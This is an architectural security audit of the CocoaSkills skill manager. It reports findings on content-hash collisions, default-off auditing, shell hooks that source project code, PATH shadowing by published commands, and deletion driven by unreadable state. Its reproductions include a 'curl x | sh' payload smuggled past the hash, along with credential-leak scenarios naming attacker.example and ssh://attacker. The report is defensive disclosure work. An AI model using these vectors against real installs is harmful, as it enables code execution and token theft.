# Architectural Security Audit — CocoaSkills (`csk`), 2026-09-17

**Scope.** The Python implementation of the Curator Protocol in this
repository at `main` `3ec79db8`: `src/csk/**` (47 803 lines, 75 files).
Tests, docs, `.venv`, `build/`, `.temp` are out of scope. This is an
implementation audit in the shape of the 2026-09-10 specification audit of
`relux-works/curator-spec` (`docs/security-audit-2026-09.md` there) and its
manager-side sibling in `relux-works/curator`: same finding classes, same
severity scale, one new specification-level finding that surfaced here and
affects both implementations.

**Method.** Three read-only sweeps (process execution and network; filesystem,
paths and locking; parsing, identity and audit gates), each run twice: a first
inventory pass, then an independent verification pass that re-read every
cited site, corrected line numbers, re-graded severities and wrote the
reproduction shape for every High and Medium finding. Verdicts are static:
"confirmed" means the inspected code path contains no mitigation; the only
dynamic checks were throwaway Python snippets against `csk.hashing`,
`csk.protocol_json` and `csk.audit.redaction` in a scratch directory (the
hash collision, the `RecursionError`, the regex timing). Nothing was executed
against a network, a registry or an operator home.

**Companion documents.** Specification: `curator-spec/docs/security-audit-2026-09.md`
(S1–S7, R/P, E1–E7). Go manager: `curator/docs/security-audit-2026-09.md`.
Registry service: `curator-skill-registry/docs/security-audit-2026-09.md`.
Finding ids here carry a `K` prefix; the cross-map in §5 names the sibling id
where one exists.

## 1. Executive summary

Two codebases live in this repository. The build-repository and compiled-
command path (`git_admission.py`, `builds/*`, `build_repository_pipeline.py`,
`transactions.py`, `locking.py`) is exceptionally hardened: argv is pinned,
child environments are fixed dictionaries, snapshots come from the git object
database with recomputed object ids, every managed write is `O_EXCL` or
rename-no-replace with digest re-validation, and the protected caches prove
ownership, mode and link-freedom on every read. The older skill-install path
(`git_ops.py`, `closure.py`, `installer.py` helpers, `shims.py`,
`shell_init.py`, `audit/*`) is where every High finding lives. The gaps are
concentrated in six places:

1. **The content hash is not injective** (K1). `core.md` §8 frames the
   Curator content hash as `UTF8(path) || 0x00 || file_bytes` joined by
   `0x00`, with no length prefix and no domain separation. File bytes may
   contain `0x00`, so two different trees hash identically; a clean-auditing
   single-file tree and a hostile multi-file tree share one hash, and that
   hash keys the verdict cache, the `--allow` pin, the revocation match and
   the registry `audited` match. Both implementations are conformant to the
   defective text.
2. **The assurance stack is inert by default** (K2). `audit.enabled=false`,
   `mode=advisory`, no built-in registries, empty `allowed_sources`: a stock
   `csk install` runs no detector, no revocation lookup and no allowlist, and
   advisory mode never blocks even when enabled.
3. **Project-controlled shell code and PATH** (K3, K4). The shell hook sources
   `.agents/env.sh` from any ancestor of `$PWD` on every `cd` with no
   approval, and a skill may publish a command named `git`, `ssh` or `csk`
   into a directory that is prepended to `PATH`; the manager's own git
   calls resolve `"git"` from that PATH.
4. **Read failures become absence, and absence authorises deletion** (K5,
   K6). An unreadable install marker or consumer registry yields "no
   references", which the installer turns into a removal of another
   project's runtime and an authoritative rewrite of the consumer registry
   that drops every other project; the inputs of that decision are read
   before the home lock and outside the generation probe; a ledger file in
   `~/.local/bin` that any user process can write lists which binaries csk
   may delete. `gc.py` already has the strict readers and the
   uncertain-means-retain rule; the installer does not use them.
5. **The static audit's coverage is self-declarable and language-bound**
   (K7, K8, K9). No secret-value detector exists; `.js`/`.ts`/`.rb`/… are
   never scanned although `node-v1` is an admitted interpreter; files over
   1 MB are skipped silently; a manifest declaring `network: ["*"]` silences
   the network detector.
6. **Snapshot bytes are host-dependent** (K10). Skill snapshots come from
   `git archive` under the operator's full git configuration, so
   `.gitattributes` (`export-subst`, `export-ignore`, `eol`) and the host's
   attribute files change the bytes that are hashed and attested; the
   build-repository path already does this right.

## 2. Confirmed strengths

- **Git admission** (`git_admission.py`): `https`/`ssh` only, no userinfo, no
  port, canonical re-parse equality, `protocol.allow=never` with one
  transport, `credential.helper=` cleared, `core.askPass` pinned to the
  broker, `core.hooksPath` emptied, `fsckObjects`, `http.followRedirects=false`,
  `sslVerify=true`, proxies cleared, `--no-tags --refmap= --jobs=1`; private
  repository state allowlisted (`HEAD`, `config`, `objects`, `refs`) and
  alternates/grafts/replace refs/promisors refused; `[include]`/`[includeIf]`
  refused; LFS pointers refused; tree modes limited to `40000/100644/100755`
  so symlinks and gitlinks never enter a snapshot; object ids recomputed on
  read; SSH pinned by an argv-checked wrapper.
- **Compile-only build boundary** (`builds/go_v1.py`): fixed argv verified by
  equality, an exact environment allowlist with `GOFLAGS=""`, `GOPROXY=off`,
  `GOSUMDB=off`, `GOVCS=*:off`, `GOTOOLCHAIN=local`, `CGO_ENABLED=0`, a
  verified-empty `PATH` directory, package fields that select any surface
  refused by name, the artifact hashed and never executed; toolchain
  discovered on the entry-time PATH, native-header checked with
  `O_NOFOLLOW`, whole-GOROOT fingerprint re-verified around every exec.
- **Transactions and locks** (`transactions.py`, `locking.py`): `O_EXCL`
  creation, rename-no-replace publication (`renameatx_np`, `renameat2`,
  `MoveFileExW` without replace), backup by rename of the live inode, fsync
  per chunk and per directory, journal reads with `O_NOFOLLOW` and
  `samestat`, every transition re-digested; persistent lock inode with
  `O_NOFOLLOW`, identity re-proved against the descriptor, no stale-lock
  breaking, lock ordering enforced per thread and per process.
- **Protected caches** (`builds/cache_posix.py`, `cache_windows.py`,
  `build_repository_pipeline.py`): `dir_fd`-relative syscalls, uid and exact
  mode and `st_nlink` proofs, quarantine instead of trust for corrupt
  entries, GC that retains anything uncertain.
- **Registry client** (`audit_registry.py`): redirects refused, TLS verified,
  plain HTTP only for loopback, 16 MiB body cap, exact Content-Type, cursor
  loop detection, Ed25519 over canonical JSON with key-id binding,
  deny-wins federation, rollback / freeze / equivocation / clock-skew
  defences with mode-checked persisted state, out-of-band key pinning with
  no first-use trust.
- **Canonical JSON** (`protocol_json.py`): duplicate keys, BOM, `NaN`,
  lone surrogates, floats and out-of-range integers rejected; round-trip
  canonicality check.
- **Fail-closed script policy**: `SCRIPT_EXECUTION_POLICIES_IMPLEMENTED` is
  empty, so an enforced execution policy is refused rather than downgraded.
- **Pins cannot bypass findings**: `_decide` puts revocation first and
  `policy.decide` never sees the trust record — the Go `decideWithPins`
  defect has no analogue here.
- **No `shell=True`, no `os.system`, no string-built argv** anywhere in
  manager code; credential tokens carried in `repr=False` fields and passed
  on stdin or in a fixed child environment, never in argv; output redaction
  for backend stderr and findings.

## 3. Findings

Severity: **High** = a hostile skill reaches an agent or the operator's shell
unaudited, or data is destroyed; **Medium** = a configured control is bypassed
or a gate silently covers less than it claims; **Low** = hardening gap with a
bounded consequence; **Info** = record.

### 3.1 Identity and the audit gate

**K1. The content hash framing is non-injective (High, specification-level).**
`hashing.py:38-46` appends `path || 0x00 || bytes` per file and joins records
with `0x00`, exactly as `core.md` §8 requires. Paths cannot contain `0x00`;
file bytes can. Reproduced with the real module: the single-file tree
`{SKILL.md: "benign\0scripts/evil.sh\0curl x | sh"}` and the two-file tree
`{SKILL.md: "benign", scripts/evil.sh: "curl x | sh"}` both hash to
`sha256:803cd58b…6b68e`. The single-file tree audits clean: files containing
`0x00` are skipped by the text detectors (`detectors.py:86`) and a root
`SKILL.md` is outside `OPAQUE_PREFIXES` (`detectors.py:57,543`). The hash keys
the verdict cache and trust pin (`audit/trust.py:96-109`), the revocation
match (`audit/pipeline.py:454-462`), the install marker, the `csk audit
--allow` pin (`cli.py:1299`) and the registry record match, which returns true
on content hash alone (`audit_registry.py:268-271`, as `registry.md:103-105`
requires). The Go manager frames identically (`curator internal/hashing/
hashing.go:26`) and matches identically (`internal/registry/registry.go:298`).
The specification's own §8.1 build-source identity shows the correct shape:
domain prefix, record tag and 8-byte lengths. Filed as
https://github.com/relux-works/curator-spec/issues/59.

*Recommendation:* amend `core.md` §8 to a length-framed, domain-separated
record (`"curator-content-v2" || 0x00`, then per file `"F" || len(path) ||
path || len(bytes) || bytes`), version the hash prefix, and require registry
records to carry the framing version; until then treat any `0x00`-bearing
file as opaque and blocking regardless of its directory.

**K2. The assurance stack is off by default, and advisory never blocks
(High).** `config.py:99-118`: `audit.enabled=False`, `mode="advisory"`,
`backend="null"`, `registry_policy="advisory"`, `allowed_sources=()`;
`BUILTIN_REGISTRIES=()` (`config.py:88`). `gate_plans` returns nothing when
disabled (`audit/pipeline.py:169-170`); `policy.decide` returns `WARN` for any
finding unless `mode == "strict"` (`audit/policy.py:18`); an empty allowlist
permits every source (`closure.py:424`, `source_identity.py:124-125`); with
no registries, `_check_audit_registries` returns before any lookup
(`installer.py:3047-3049`). A stock `csk install` therefore runs no detector,
no revocation check and no allowlist. `--audit` and `--strict-tags` only
strengthen, which is right; the default is the problem.

*Recommendation:* the same hardened-defaults profile the specification audit
asks for (S1): audit on, `strict`, a non-empty allowlist shape, and a
reported posture line at every install.

**K7. No secret-value detector (High).** `audit/detectors.py:31-40` detects
environment-variable *names* (`TOKEN`, `SECRET`, …) in code; nothing detects
a committed private key, an `AKIA…` access key, a `ghp_` token, a JWT or a
high-entropy string. `redaction.PEM_RE` and `HIGH_ENTROPY_RE`
(`audit/redaction.py:9-11`) exist but run only as output scrubbers. A skill
shipping `references/deploy.md` with a live key produces zero findings and, in
context mode, the key is copied into the agent's reading path.

**K8. Detector coverage is language-, size- and root-bound, and fails open
silently (High).** `TEXT_SUFFIXES` (`detectors.py:16-30`) omits `.js`, `.mjs`,
`.cjs`, `.ts`, `.rb`, `.php`, `.pl`, `.lua`, `.bat`, `.cmd`, `.fish`, `.psm1`,
`.go` — `node-v1` is one of the two admitted `script-worker-v1` interpreters
(`skillspec.py:65`), so node scripts are never scanned. Files over 1 MB or
containing `0x00` are `continue`d with no finding (`:86`); the opaque-file
rule re-flags only under `agents/`, `references/`, `scripts/` (`:57`), while
`assets/`, `templates/`, `data/`, `examples/` and the root are copied into the
installed context by `whitelist.INCLUDE_ROOTS` unscanned.

**K9. Self-declared capabilities silence the detectors (Medium).**
`capabilities._validate_host_glob` (`capabilities.py:93-95`) rejects only
whitespace, `/` and `\`, so `"network": ["*"]` is legal and `_host_allowed`
(`detectors.py:579-591`) admits every host; `"filesystem": ["/"]` makes
`_filesystem_allowed` (`:462-469`) admit every path. Nothing scores an
over-broad declaration, so a hostile manifest reduces the static suite to the
five unconditional rules.

**K11. Verdict and pin caches are unprotected records that skip the detectors
(Medium).** `audit/trust.py:31-52,59-93`: plain `json.loads`, files written by
`write_text` at the default umask, directories created without `mode=0o700`
(`:50,84`), no integrity envelope; a cache hit skips the canary and the
detectors (`trust.py:14-16`), and `_report_from_verdict` recomputes the
decision from the cached findings, so `"findings": []` turns a `BLOCK` into
`ALLOW`. Contrast `audit_registry._read_protected_state_file` (`:585`), which
refuses group/other-readable state.

**K12. `csk audit` skips transitive requirements and clones ungated (Medium).**
`audit/runner.py:26-34` → `installer._build_plans` walks only
`project_manifest.skills` (`installer.py:2916`), and `_ensure_skill_repo`
(`installer.py:2940-2969`) clones `decl.git` with no `_gate_source`. Install-
time gating does cover the full closure; the audit *command* does not.

**K13. Local and `file:` sources bypass the allowlist and the registry
(Medium).** `is_allowed(None, …)` is true (`source_identity.py:118-128`) and
`canonical_source_identity` returns `None` for `file:`, `/`, `./`, `../`, `~`
(`:65-66`), so `_gate_source` (`closure.py:422-427`) never consults a
populated allowlist for them; `ALLOWED_GIT_PROTOCOLS` admits `file:`
(`git_ops.py:20`). The same `identity is None → continue` skips the registry
lookup, revocations included (`installer.py:3084-3086`, `attest.py:75-78`). In
context mode the foreign repository's content is copied into
`.agents/skills/<name>`.

**K14. Repository cache reuse without origin verification (High).**
`closure._ensure_repo` (`closure.py:282-308`) returns an existing
`skills_root/<source>` unconditionally — no `_gate_source`, and no
`git remote get-url` / `ls-remote` anywhere in the codebase. A transitive
requirement's `source` is its own name (`closure.py:131`), so a hostile
manifest declaring `dependencies.skills.<victim-name>` seeds or reuses the
victim's cache directory; `resolve_ref` prefers `refs/remotes/origin/<value>`
for branches (`git_ops.py:84-88`), so moved refs in a pre-planted repository
decide the commit. `installer._ensure_skill_repo` (`:2947-2952`) is the same
path for `csk audit` and global installs.

**K15. Dev substitutions bypass policy under the default posture (Medium).**
`Skillfile.dev.json` redirects any skill to an arbitrary path or URL
(`dev_substitutions.py:141-180`); it is refused only when
`audit.enabled and mode == "strict"` (`installer.py:400-404`), and the `path`
branch of `_resolve_node` (`closure.py:205-212`) never calls `_gate_source`.
The gitignore gate (`installer.py:405-414`) keeps a committed dev manifest
from being honoured, which is the only barrier.

**K16. Environment variables relocate the locked system configuration
(Medium).** `CSK_CONFIG` and `CSK_SYSTEM_CONFIG` (`config.py:162-175`) point
the user config and the *enforced* system config at any file, so a
device-managed `locked` key set (`_apply_system_config`, `:205-247`, otherwise
sound) is neutralised by one exported variable.

**K17. `audit.grants` is a dead control (Low).** Parsed, validated, persisted
and round-tripped (`config.py:109,666-668,719,748`) and never read.

**K18. Canary is a subset assertion and the cache skips it (Low).**
`canary.py:10-38` omits `undeclared-exec`, `filesystem-outside-envelope`,
`dynamic-exec`, `dynamic-import`, `command-shadows-system`; a verdict cache
hit skips the canary entirely.

### 3.2 Shell integration, shims and process execution

**K3. The shell hook sources project-controlled shell code on every `cd`
(High; sibling S6/I1).** `shell_init.py:109-172` installs a zsh `chpwd` /
bash `PROMPT_COMMAND` hook that walks up from `$PWD` and runs
`. "$env_file"` on the first `.agents/env.sh` it finds (`:157`); the
PowerShell hook (`:197-237`) does the same with `.agents/env.ps1`;
`~/.cocoaskills/global/env.sh` is sourced the same way. No ownership check,
no digest pin, no first-use approval. `git clone <hostile> && cd <hostile>`
executes attacker shell code with no `csk` command involved. The hook is
opt-in (`csk shell-init --install`) and silent thereafter; `SECURITY.md` does
not mention it.

*Recommendation:* the `direnv allow` shape — source only files whose digest
the manager recorded or the operator approved; unknown or changed files warn
and are skipped.

**K4. No reserved-name rule for published commands, and `.agents/bin` is
prepended to `PATH` (High; sibling E4).** `shims._require_command_name`
(`shims.py:855`) accepts any portable identifier (`identifiers.py:24`,
Windows device names excluded); there is no `csk-*`/`curator-*`/system-binary
reserved set. `env_files.py:26` prepends `$CSK_PROJECT_ROOT/.agents/bin` to
`PATH`, so a skill exporting `git`, `go`, `ssh`, `python` or `csk` shadows the
real binary for every consumer of that PATH. Collision detection is
skill-versus-skill only (`installer.py:2972`). Composition: the manager
itself invokes bare `"git"` on the inherited PATH (`git_ops.py:44`), so after
K3 has sourced a project `env.sh` a later `csk` run resolves its own git to
the skill's shim; `csk config build-https login` then writes the operator's
token on stdin to it (`build_https.py:209-224`, CLI passes no `git=` at
`cli.py:1095,1116,1119,1141`), and `("ssh-add", "-l")` runs with a live
`SSH_AUTH_SOCK` (`build_ssh.py:188-190`).

**K10. Skill snapshots come from `git archive` under the operator's git
configuration (Medium; sibling M3).** `git_ops.py:101-108` runs
`git -C <repo> archive --format=tar <commit>` with the full inherited
environment: none of `GIT_ATTR_NOSYSTEM`, `GIT_CONFIG_GLOBAL`,
`GIT_CONFIG_NOSYSTEM` that `_clean_git_environment` sets for build
repositories (`git_admission.py:931-941`). `export-ignore` removes files
present in the commit, `export-subst` rewrites content, `text`/`eol` and
the host's attribute files change bytes; `content_sha256` hashes the
extracted directory (`installer.py:3087`), so the identity attested and
matched is attribute- and host-dependent. No mention of these attributes
exists in `src/`, `docs/` or `SECURITY.md`. The build-repository path reads
the object database (`git_admission.py:1247`, `_walk_tree`) and is immune.

**K19. Skill-repository transports are overbroad (Medium).**
`manifest.py:222-224` and `skillspec.py:611-613` validate a `git` URL only as
a non-empty string; `ALLOWED_GIT_PROTOCOLS = "file:git:http:https:ssh"`
(`git_ops.py:20`) admits unauthenticated `git:`, plaintext `http:` and local
`file:`. `ext::` is correctly blocked and `-`-prefixed URLs and refs are
refused, so this is not remote code execution; it is plaintext content and
local reads chosen by package content.

**K20. Legacy git children run with no timeout and the operator's whole
environment (Medium).** `git_ops._run`/`git()` (`:29-49`) inherit
`SSH_AUTH_SOCK`, `GIT_ASKPASS`, `GIT_SSH_COMMAND`, `GIT_CONFIG_*` and set no
timeout; `fetch_repo` (`:111-113`) runs `git fetch --all --tags --prune`
without `GIT_ALLOW_PROTOCOL` and without `GIT_TERMINAL_PROMPT=0`, so a
transitive `ssh://attacker` source offers the operator's agent keys to the
attacker's host and can hang on a prompt.

**K21. An unpinned HTTPS build token is offered to every build host in the
closure (Medium).** `OperatorHTTPSToken.covers` (`installer.py:218`) is true
when no `CSK_BUILD_HTTPS_HOST` is set, and the host comes from the
manifest's build-repository URL (`:1398-1399`); a hostile schema-7 manifest
naming `https://attacker.example/repo.git` receives the operator's token by
basic auth. Documented, but default-unpinned.

**K22. Fail-open on unknown or unreachable registries (Medium; sibling S3).**
A delivered revocation always fails closed (`installer.py:3097`) and
all-tampered snapshots fail closed (`:3072-3074`); an UNKNOWN artifact blocks
only under `strict` (`:3103`) and an unreachable registry warns with a
seven-day offline grace (`audit_registry.py:824-826`, `:34`). Blackholing
the registry withholds a new revocation for a week under the default policy.

**K23. Terminal-escape injection through package strings (Medium).**
`command.hint`, `dependency.hint` and `requirement.hint` are validated only
as non-empty strings (`skillspec.py:308-312,568`) and are interpolated
without `!r` into messages printed to stderr (`installer.py:2995,3018,3148,
3153`); detector evidence survives `_short_evidence` (`detectors.py:620-622`,
`str.split()` does not strip `ESC`) into `pipeline.py:217,427`; the Skillfile
`git` URL itself lacks the `Cc` check its sibling fields have (`manifest.py:
222-224` versus `:257-262`) and is echoed raw on clone failure
(`installer.py:2959,2968`, `closure.py:320`, `git_ops.py:69`). CSI/OSC
sequences reach the operator's terminal from `csk install` and `csk audit`.

**K24. Secrets reach audit backends and argv (Low).** `codex_backend.py:63`
runs the cloud backend with the full inherited environment (no `env=`),
`command_backend.py:58` copies `os.environ`; `--token` for `csk audit
--publish` (`cli.py:668` → `:1332`) puts the bearer token in `ps` and shell
history while `CSK_REGISTRY_TOKEN` is the fallback rather than the default.

**K25. Package-influenced launcher PATH (Low).** `_runtime_path_entries`
(`installer.py:3195-3204`) bakes the directory of `shutil.which(
dependency.command)` — a name from the skill's own manifest — into that
skill's launcher PATH prefix.

**K26. Illusory git version pin (Info).** `installer.py:785,814` derives
`allowed_versions=(version,)` from the probe it later validates
(`git_admission.py:604`); no operator-pinned set exists.

### 3.3 Filesystem, markers and stores

**K5. Read failures are downgraded to absence, and absence authorises removal
(Medium, systemic; sibling §8.4 / E5 class).** `installer._read_marker`
(`:3749-3756`) returns `None` on `OSError` or a malformed marker, and
`Path.exists()` is false on any `OSError` (the stdlib swallows `EACCES`,
`ELOOP`, `ENAMETOOLONG`, `ENOTDIR`, `EIO`); `_marker_references`
(`:2803-2821`) then contributes no runtime reference for that skill, and the
removal planner (`:1829-1854`) emits an `80-removal` target for
`runtime/<skill>/<commit>` in the live runtime root — another project's
runtime tree is removed and its shims dangle. `consumers.load_consumers`
(`consumers.py:21-32`) returns `[]` on a parse or read error, so
`_runtime_references_for_plan` (`installer.py:2027`) and
`_prune_staged_runtime` (`:2871`) see no external consumers, and
`_desired_consumers` (`:2824-2844`) then **writes the registry back**
through the `90-consumer` target (`:2702-2717`) containing only the current
project, permanently deregistering every other one. The reference set is
computed at plan time, before `ManagerHomeLock` (`:579-589` versus `:601`),
and `_project_generation_probe` (`:1712-1745`) omits `consumers.json`, the
runtime root and other projects' skill roots that the planner reads (the
global probe, `global_install.py:1293-1339`, includes them), so a concurrent
install by project B between A's plan and A's commit does not invalidate
A's removal. `gc.py` has the strict reader (`_load_consumers_strict`,
`:237-271`) and retains on uncertainty (`:191-195`); the installer does not
use it. The same class: `global_install._read_installed_marker` (`:155-159`)
retains the skill directory but skips its runtime reference (a half-deleted
install on `csk global install --only`); `attest.py:56-60` omits an
unreadable marker's row silently, so a revoked skill whose marker cannot be
read makes `csk attest` exit 0; `mcp_configs._claude_disabled_servers`
(`:161-176`) fails open (an unreadable settings file disables nothing, so a
disabled required server passes); `adapters._read_managed` (`:424-445`) and
`global_bins._read_managed` (`:396-417`) fail open to "manages nothing",
after which the ledger is republished without the entries and previously
managed shims are orphaned. Severity is Medium rather than High because the
destroyed state is manager-owned and regenerable by reinstall and a corrupt
or unreadable marker is required; the cross-project consequence and the
authoritative rewrite are what make it more than a hygiene item.

*Recommendation:* one strict reader (absent, unreadable, malformed as three
outcomes) shared by installer, global and attest paths; an "uncertain" state
that disables every removal target and every authoritative rewrite the way
`gc._collect_locked` does; `consumers.json`, the runtime root and peer skill
roots added to the project generation probe so the removal inputs are inside
the concurrency guard.

**K6. Ledger files in operator directories authorise deletion (Medium).**
`~/.local/bin/.csk-managed.json` (`global_bins.py:396-417`, `:78-95`): every
name listed there and not currently expected becomes a `UserBinTarget(
desired_kind="remove")` that deletes `~/.local/bin/<name>` with no proof csk
authored it; the preimage is captured from whatever is there
(`installer.py:2044-2053`), and `_is_unmanaged_conflict` (`:426-435`) treats a
listed name as owned, suppressing the conflict check. The same shape governs
`~/.claude/skills/.csk-managed.json` and the codex/gemini/cursor/agents
mirrors (`adapters.py:424-445`, `:249-262`), and the bare presence of a
`.csk-install.json` makes a directory replaceable (`adapters.py:464`). The
ledger lives in the very directory it authorises writes to, which any user
process — including a skill's own script — can write; the removal loop has
no `_is_unmanaged_conflict` gate (that gate guards only the publish loop),
and the preimage check compares the current bytes with the commit-time
bytes, never authorship. The same actor could replace the binary directly,
which caps the severity at Medium; a stale ledger copied from another home
reproduces it without malice.

*Recommendation:* the ledger moves into the manager home, and removal
requires positive authorship evidence (a recorded content digest or inode
identity of the shim) rather than a name in a list.

**K27. The skill snapshot cache is trusted as a record on the install path
(Low-Medium; sibling S5).** `snapshot.py:17-31`: `if target.exists(): return
target` — `exists()` follows symlinks; no `lstat`, no ownership or mode
proof, no re-hash against the commit. The closure read-only path
(`closure.py:395-405`) and gc (`gc.py:482`) are stricter; the mutating path
is the outlier. Confined to the `0o700` manager home, so it needs local
write access there, after which the cached bytes for a pinned commit are
whatever was written and the marker records the pin.

**K28. Whole-file rewrites of operator-owned files follow symlinks and are
not atomic (Low-Medium).** `gitignore_gate.py:40-48` appends to the
operator's `.gitignore` with `read_text`/`write_text`: a symlinked
`.gitignore` is written through, and `exists()` returning false on an
`OSError` (`EACCES`, `ELOOP`, `ENAMETOOLONG`, `ENOTDIR`) collapses the file
to the csk block — reachable from `csk init` (`cli.py:1005`) and
`csk install --fix-gitignore`, with a narrow trigger. `manifest.py:141-142`
(`Skillfile.json` on `csk add/remove`), `hybrid.py:157-161`,
`global_install.py:1379-1381`, `consumers.py:59-63` and the `_write_managed`
ledgers (`global_bins.py:420-423`, `adapters.py:448-451`) rewrite whole
files with no temp-and-replace and no fsync, while `config.py:417-441` in
the same codebase shows the correct pattern (`mkstemp`, `fchmod`, fsync,
`os.replace`); a truncated ledger is read as "manages nothing".
`audit_registry._write_cache` (`:1001-1010`) uses a fixed `<name>.tmp`
temporary that follows a planted symlink and races between processes.

**K29. Weaker second walkers and dead unsafe callers (Low-Medium).**
`gc._collect_snapshots` (`gc.py:472-494`) uses `rglob("snapshot")` and an
unconditional `shutil.rmtree` of `commit_dir` with no per-level `lstat` and
no "uncertain" path, unlike `_collect_runtime_entries` (`:497-540`) — Low,
since `rglob` does not recurse links and the blast radius is the `0o700`
cache. `shims._clear_shim` + `write_text` (`shims.py:617-644`, `:929-936`)
is a remove-then-create that follows a symlink, safe today only because
every live caller writes into a staging root; `global_bins.refresh_user_bin_
shims` (`:211-274`), `adapters._refresh_adapter_groups`/`_refresh_entry`
(`:136-187`), `consumers.record_consumer` (`:35-41`) and
`transactions._copy_target` (`:1800-1823`) have no callers, and the first
two would write into live operator directories with remove-then-create if
re-wired.

**K30. Staging root in the project's parent (Low).** `installer.py:2337-2361`
creates `.csk-materialization-plan-*` beside the project for same-filesystem
renames; a hard crash leaks it, and `gc.sweep_orphans` (`_ORPHAN_RE`,
`gc.py:24-27`) does not match it.

**K31. Resource bounds (Medium).** No depth or node bound on the closure
worklist (`closure.py:107-141`), recursive directory collection
(`builds/source.py:246-294`) and recursive JSON walkers (`protocol_json.py:
108,167`) all raise `RecursionError`, which is not in the CLI catch set
(`cli.py:74-90`) — `csk skill check` on a deep-nested manifest prints a raw
traceback. `_build_request` reads every snapshot file before
`max_request_bytes` is checked (`pipeline.py:301-313` versus `:99-101`), and
`ENV_ASSIGNMENT_RE` (`redaction.py:8`) is super-linear: `"KEY" * 40000`
takes 17.8 s to scrub. Marker, manifest and consumer readers (`_read_marker`,
`install_marker.read_install_marker`, `manifest.load_manifest`,
`hybrid._read_or_init`, `consumers.load_consumers`, `attest._attest_root`,
the two `_read_managed`) call `read_bytes()` with no size gate, unlike the
16 MiB bound on transaction journals (`transactions.py:2206-2227`).

**K32. Typed errors escape the CLI on non-install commands (Medium).**
`cli.py:72-90` wraps `InstallError`, `GitError`, `ValueError` and a fixed
set; `SkillSpecError`, `ClosureError`, `HashingError`, `WhitelistError`,
`LocaleError`, `SnapshotError`, `RegistryError`, `OSError` and
`RecursionError` are wrapped only on the install path (`installer.py:663`)
and surface as tracebacks from `csk status`, `csk audit`, `csk hybrid`,
`csk gc`, `csk skill check`; `cli.py:896-902` catches only `ValueError`
around a marker read.

**K33. Minor filesystem records (Low/Info).** `git_admission.Snapshot.
materialize` creates parent directories before the containment check
(`:236-244`, unreachable via `_walk_tree`); `_walk_tree` (`:1517`) rejects
`.`, `..`, `/`, NUL and NFC collisions but not Windows reserved device names,
unlike `git_ops._extract_archive`; identifiers are not Unicode-normalised
(`identifiers.py:24-25`, caught at commit by `transactions.
_validate_namespace_independence`); NFD keys in `hashing`/`whitelist`/
`git_ops` versus NFC keys in `transactions`/`git_admission`; `builds/cache.
py:222` `chmod` follows a link the preceding `lstat` did not; the registry
records cache directory is created without `mode=0o700`
(`audit_registry.py:802`); the Python 3.11 tar fallback extracts without
`filter=` on pre-validated members (`git_ops.py:171-177`); `_safe_component`
collapses distinct backend names onto one verdict file (`trust.py:108`);
the frontmatter rewriter (`locale.py:226-248`) treats NEL/LS/PS as fences,
accepts an indented `---`, silently no-ops on a BOM and drops every key but
`name`; CCJ-1 emits raw U+2028/U+2029/U+0085/DEL as `registry.md` permits.

## 4. Priority summary

| # | Finding | Severity | Where |
|---|---|---|---|
| K1 | Content-hash framing collision (spec-level, both implementations) | High | `hashing.py:38-46`, `core.md` §8, `audit_registry.py:268-271` |
| K2 | Audit, registry and allowlist off by default; advisory never blocks | High | `config.py:88,99-118`, `pipeline.py:169-170`, `policy.py:18` |
| K3 | Shell hook sources project `.agents/env.sh` on `cd` | High | `shell_init.py:109-172,197-237` |
| K4 | No reserved command names; `.agents/bin` prepended to PATH; manager's own `git` on ambient PATH | High | `shims.py:855`, `env_files.py:26`, `git_ops.py:44` |
| K14 | Repository cache reuse with no origin check; transitive seeds by name | High | `closure.py:282-308,131`, `installer.py:2947-2952` |
| K7 | No secret-value detector | High | `audit/detectors.py` |
| K8 | Detector language/size/root coverage gaps fail open silently | High | `detectors.py:16-30,57,80,86` |
| K5 | Read failure → absence → runtime removal, consumer-registry rewrite, lock-free removal inputs, `attest` blind spot | Medium (systemic) | `installer.py:3749,2803,1829,2824,1712`, `consumers.py:21-32`, `global_install.py:155-159`, `attest.py:56-60` |
| K6 | Ledgers in operator directories authorise deletion | Medium | `global_bins.py:78-95,396-417`, `adapters.py:249-262,424-445,464` |
| K9 | Self-declared capabilities silence detectors | Medium | `capabilities.py:93-95`, `detectors.py:462-469,579-591` |
| K10 | `git archive` under host git config decides hashed bytes | Medium | `git_ops.py:101-108`, `installer.py:3087` |
| K11 | Verdict/pin cache poisoning skips detectors | Medium | `audit/trust.py:31-93` |
| K12 | `csk audit` skips transitive requirements, clones ungated | Medium | `audit/runner.py:26-34`, `installer.py:2916,2940-2969` |
| K13 | Local/`file:` sources bypass allowlist and registry | Medium | `source_identity.py:65-66,118-128`, `installer.py:3084-3086` |
| K15 | Dev substitutions bypass policy under default posture | Medium | `dev_substitutions.py`, `installer.py:400-404`, `closure.py:205-212` |
| K16 | `CSK_SYSTEM_CONFIG` relocates the locked config | Medium | `config.py:162-175` |
| K19 | Overbroad skill transports (`git:`, `http:`, `file:`) | Medium | `manifest.py:222-224`, `git_ops.py:20` |
| K20 | Legacy git children: no timeout, full environment | Medium | `git_ops.py:29-49,111-113` |
| K21 | Unpinned HTTPS build token offered to any build host | Medium | `installer.py:218,1398-1399` |
| K22 | Fail-open on unknown/unreachable registries, 7-day grace | Medium | `installer.py:3103`, `audit_registry.py:824-826` |
| K23 | Terminal-escape injection via hint, evidence, `git` URL | Medium | `installer.py:2959,2995,3148`, `pipeline.py:217,427` |
| K31 | Unbounded recursion, unbounded reads and super-linear redaction | Medium | `protocol_json.py`, `closure.py:107-141`, `redaction.py:8` |
| K32 | Typed errors escape the CLI on non-install commands | Medium | `cli.py:72-90,896-902` |
| K27 | Snapshot cache trusted as record on install | Low-Medium | `snapshot.py:17-31` |
| K28 | Symlink-following, non-atomic rewrites of operator files and ledgers | Low-Medium | `gitignore_gate.py:40-48`, `manifest.py:141-142`, `audit_registry.py:1001-1010` |
| K29 | Weaker second walkers, dead unsafe callers | Low-Medium | `gc.py:472-494`, `shims.py:617-644` |
| K24 | Secrets to backends and argv | Low | `codex_backend.py:63`, `cli.py:668` |
| K25 | Package-influenced launcher PATH | Low | `installer.py:3195-3204` |
| K17 | `audit.grants` dead control | Low | `config.py:109` |
| K18 | Canary subset; cache skips canary | Low | `canary.py:10-38` |
| K30 | Staging root in project parent, unswept | Low | `installer.py:2337-2361` |
| K26 | Illusory git version pin | Info | `installer.py:785,814` |
| K33 | Minor records | Low/Info | see §3.3 |

## 5. Cross-map to the Curator audits

| Curator finding | cocoaskills | Note |
|---|---|---|
| S1 permissive defaults | K2 | worse here: the audit is off, not merely advisory |
| S3 revocation hiding under advisory | K22 | delivered revocations fail closed; UNKNOWN/unreachable fail open |
